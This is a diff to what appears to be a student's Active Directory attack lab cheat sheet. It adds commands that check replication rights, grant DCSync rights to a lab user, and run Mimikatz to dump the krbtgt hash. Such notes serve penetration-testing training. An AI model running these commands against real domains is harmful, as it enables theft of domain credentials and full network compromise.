@@ -357,12 +357,16 @@ This method targets a DC, requests directory replication, and collects password 
 #### Validate Replication Rights 
 Check for DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights
 ```powershell
-Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "dcorp\student525"}
+Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student525"}
 ```
 #### Add replication rights to user
 ```powershell
 Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student525 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
 ```
+#### Le mimiz
+```powershell
+ Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+ ```
 ## Lateral Movement
 All the PS remoting 
 
